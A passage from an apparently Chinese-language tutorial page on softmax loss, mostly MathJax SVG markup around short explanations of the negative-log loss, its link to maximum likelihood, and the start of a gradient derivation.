597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\" transform=\"translate(500,0)\"/></g><rect width=\"1200\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(11760.2,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(12816,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/><path data-c=\"2E\" d=\"M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z\" transform=\"translate(500,0)\"/><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(14094,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mstyle\" transform=\"translate(14372,0)\"><g data-mml-node=\"mspace\"/></g><g data-mml-node=\"msub\" transform=\"translate(15538.7,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(16756,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(17811.8,0)\"><g data-mml-node=\"mn\" transform=\"translate(470,676)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(220,-686)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\" transform=\"translate(500,0)\"/></g><rect width=\"1200\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(19529.5,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(20585.3,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/><path data-c=\"2E\" d=\"M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z\" transform=\"translate(500,0)\"/><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\" transform=\"translate(778,0)\"/></g></g></g></svg></mjx-container></span></p>\n<h2 id=\"softmax-损失函数数学解释\">Softmax 损失函数数学解释</h2>\n<p>直观上取 log 很合理，正确样本的概率小，惩罚就大。</p>\n<p>最大似然估计就是所有正确标签的概率乘积最大（或对数和最大）。</p>\n<p>所以 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"23.453ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 10366.1 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(714,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1285.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2341.5,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3286.2,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(4564.2,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"mo\" transform=\"translate(4564.2,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mtext\" transform=\"translate(4953.2,0)\"><path data-c=\"73\" d=\"M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(394,0)\"/><path data-c=\"66\" d=\"M273 0Q255 3 146 3Q43 3 34 0H26V46H42Q70 46 91 49Q99 52 103 60Q104 62 104 224V385H33V431H104V497L105 564L107 574Q126 639 171 668T266 704Q267 704 275 704T289 705Q330 702 351 679T372 627Q372 604 358 590T321 576T284 590T270 627Q270 647 288 667H284Q280 668 273 668Q245 668 223 647T189 592Q183 572 182 497V431H293V385H185V225Q185 63 186 61T189 57T194 54T199 51T206 49T213 48T222 47T231 47T241 46T251 46H282V0H273Z\" transform=\"translate(894,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(1200,0)\"/><path data-c=\"6D\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\" transform=\"translate(1589,0)\"/><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\" transform=\"translate(2422,0)\"/><path data-c=\"78\" d=\"M201 0Q189 3 102 3Q26 3 17 0H11V46H25Q48 47 67 52T96 61T121 78T139 96T160 122T180 150L226 210L168 288Q159 301 149 315T133 336T122 351T113 363T107 370T100 376T94 379T88 381T80 383Q74 383 44 385H16V431H23Q59 429 126 429Q219 429 229 431H237V385Q201 381 201 369Q201 367 211 353T239 315T268 274L272 270L297 304Q329 345 329 358Q329 364 327 369T322 376T317 380T310 384L307 385H302V431H309Q324 428 408 428Q487 428 493 431H499V385H492Q443 385 411 368Q394 360 377 341T312 257L296 236L358 151Q424 61 429 57T446 50Q464 46 499 46H516V0H510H502Q494 1 482 1T457 2T432 2T414 3Q403 3 377 3T327 1L304 0H295V46H298Q309 46 320 51T331 63Q331 65 291 120L250 175Q249 174 219 133T185 88Q181 83 181 74Q181 63 188 55T206 46Q208 46 208 23V0H201Z\" transform=\"translate(2922,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(8403.2,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(8792.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(9588.1,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(9977.1,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> ，<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.663ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"10.344ex\" height=\"2.36ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 4572.1 1043.1\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(958.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"munder\" transform=\"translate(2014.6,0)\"><g data-mml-node=\"mo\"><path data-c=\"2211\" d=\"M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1089,-285.4) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"msub\" transform=\"translate(3564.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(714,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span></p>\n<p>让损失函数最小就是在让最大似然最大。</p>\n<p>损失函数最小就说明现在的模型参数最好的拟合了样本。</p>\n<h2 id=\"softmax-计算梯度\">Softmax 计算梯度</h2>\n<p>loss 是由 W 算出来的，所以可以求出此时 W 演什么方向变化能让 loss\n减小的最快。</p>\n<p>即求： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -1.602ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"4.647ex\" height=\"4.749ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1391 2054 2099\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(403.5,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g></g><rect width=\"1814\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span></p>\n<p>记 softmax 概率为： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.893ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"14.544ex\" height=\"5.951ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1351.5 6428.5 2630.4\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 